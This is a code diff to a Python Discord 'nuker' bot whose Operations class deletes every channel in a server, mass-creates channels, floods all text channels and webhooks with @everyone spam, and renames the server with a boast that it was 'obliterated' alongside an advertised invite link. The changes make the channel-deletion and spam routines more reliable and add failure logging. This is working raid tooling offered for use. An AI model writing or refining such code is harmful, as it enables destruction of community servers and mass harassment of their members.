@@ -1,5 +1,6 @@
 from __future__ import annotations
 import asyncio
+import base64
 import os
 import logging
 import random
@@ -43,44 +44,59 @@ class Operations:
         names = self.settings.channel_names
         return random.choice(names) if names else "fluked"
 
+    async def _get_channels(self, guild_id: int) -> list[int]:
+        url = f"{API}/guilds/{guild_id}/channels"
+        try:
+            async with self.session.get(url) as res:
+                if res.status == 200:
+                    data = await res.json()
+                    return [c["id"] for c in data]
+        except Exception:
+            pass
+        return []
+
     async def CrChannel(self, guild: discord.Guild) -> int:
         count = self.settings.channel_count
         names_pool = self.settings.channel_names or ["fluked"]
-        payload = {"name": "", "type": 0}
         tasks = []
         for i in range(count):
-            base = names_pool[i % len(names_pool)]
-            name = f"{base}-{i}" if count > len(names_pool) else base
-            payload["name"] = name
+            name = names_pool[i % len(names_pool)]
             url = f"{API}/guilds/{guild.id}/channels"
-            tasks.append(asyncio.create_task(self._post(url, payload)))
+            payload = {"name": name, "type": 0}
+            tasks.append(asyncio.create_task(self._post(url, payload, i)))
         results = await asyncio.gather(*tasks, return_exceptions=True)
         ok = sum(1 for r in results if not isinstance(r, Exception) and r)
+        fails = [r for r in results if isinstance(r, Exception) or not r]
+        if fails:
+            logging.warning(f"[CrChannel] {len(fails)} failed (sample: {fails[:3]})")
         logging.info(f"[CrChannel] {ok}/{count}")
         return ok
 
     async def DelChannels(self, guild: discord.Guild) -> int:
+        channel_ids = await self._get_channels(guild.id)
+        if not channel_ids:
+            return 0
         tasks = []
-        for channel in guild.channels:
-            url = f"{API}/channels/{channel.id}"
+        for cid in channel_ids:
+            url = f"{API}/channels/{cid}"
             tasks.append(asyncio.create_task(self._delete(url)))
         results = await asyncio.gather(*tasks, return_exceptions=True)
         ok = sum(1 for r in results if not isinstance(r, Exception) and r)
-        logging.info(f"[DelChannels] {ok}")
+        logging.info(f"[DelChannels] {ok}/{len(channel_ids)}")
         return ok
 
     async def spam(self, guild: discord.Guild) -> int:
         text_channels = [c for c in guild.text_channels if c.permissions_for(guild.me).send_messages]
         if not text_channels:
             return 0
-        payload = {
-            "content": self.settings.spam_message,
-            "allowed_mentions": {"parse": ["users", "roles", "everyone"]},
-        }
         tasks = []
         for _ in range(self.settings.spam_count):
             for channel in text_channels:
                 url = f"{API}/channels/{channel.id}/messages"
+                payload = {
+                    "content": self.settings.spam_message,
+                    "allowed_mentions": {"parse": ["users", "roles", "everyone"]},
+                }
                 tasks.append(asyncio.create_task(self._post(url, payload)))
         results = await asyncio.gather(*tasks, return_exceptions=True)
         ok = sum(1 for r in results if not isinstance(r, Exception) and r)
@@ -106,10 +122,8 @@ class Operations:
                 server_splash = file.read()
             server_banner = server_splash
 
-        # delete existing scheduled events
         asyncio.create_task(self._delete_scheduled_events(guild.id))
 
-        # create scheduled event
         event_payload = {
             "name": State.get_phrase(),
             "privacy_level": 2,
@@ -123,7 +137,6 @@ class Operations:
             event_payload["image"] = server_banner
         asyncio.create_task(self._create_scheduled_event(guild.id, event_payload))
 
-        # edit guild
         edit_payload = {
             "name": settings.server_name,
             "description": "This place has been obliterated by https://discord.gg/Y6qZ4TKRM5. Join now if you want a bot like this.",
@@ -173,14 +186,12 @@ class Operations:
         if not text_channels:
             return 0
 
-        # create webhooks
         webhook_tasks = [asyncio.create_task(self._create_webhook(c.id)) for c in text_channels]
         results = await asyncio.gather(*webhook_tasks, return_exceptions=True)
         valid = [r for r in results if not isinstance(r, Exception) and r]
         if not valid:
             return 0
 
-        # spam webhooks
         send_tasks = []
         for _ in range(self.settings.webhook_count):
             for wid, wtoken in valid:
@@ -209,11 +220,18 @@ class Operations:
             return None
         return None
 
-    async def _post(self, url: str, payload: dict) -> bool:
+    async def _post(self, url: str, payload: dict, idx: int = -1) -> bool:
         try:
             async with self.session.post(url, json=payload) as res:
-                return res.status in (200, 201)
-        except Exception:
+                if res.status in (200, 201):
+                    return True
+                if idx < 5 or idx == -1:
+                    body = await res.text()
+                    logging.warning(f"[post] idx={idx} status={res.status} body={body[:200]}")
+                return False
+        except Exception as e:
+            if idx < 5:
+                logging.error(f"[post] idx={idx} exception: {e!r}")
             return False
 
     async def _delete(self, url: str) -> bool:
